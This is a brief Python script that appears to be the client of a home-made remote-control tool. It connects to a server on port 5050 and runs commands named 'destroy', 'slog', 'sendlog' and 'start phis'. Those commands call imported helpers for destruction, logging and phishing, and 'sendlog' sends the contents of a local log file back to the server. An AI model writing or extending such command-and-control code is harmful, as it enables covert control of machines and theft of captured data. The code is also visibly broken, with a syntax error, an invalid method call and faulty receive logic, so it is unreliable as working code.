
import socket
from main import get_ip,destroy,log,phis

HEADER = 64
port = 5050
server = get_ip()
Addr = (server, port)


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(Addr)


def send(msg):
    message = msg.encode("utf-8")
    msg_lenght= msg.length()
    send_length= str(msg_lenght).encode("utf-8")
    send_length+=b' '* (HEADER-len(send_length))
    client.send(send_length)
    client.send(message)
    print(client.recv(999).decode())

while True:
    if client.recv(HEADER).decode("utf-8")=="destroy":
        destroy()
    elif client.recv(HEADER).decode("utf-8")=="slog":
        log()
    elif client.recv(HEADER).decode("utf-8")=="sendlog":
        send("sending log......")
        f = open("programm/log.txt")
        r  =f.readlines()
        send(r)
    elif client.recv(HEADER).decode("utf-8")=="start phis"):
        phis()
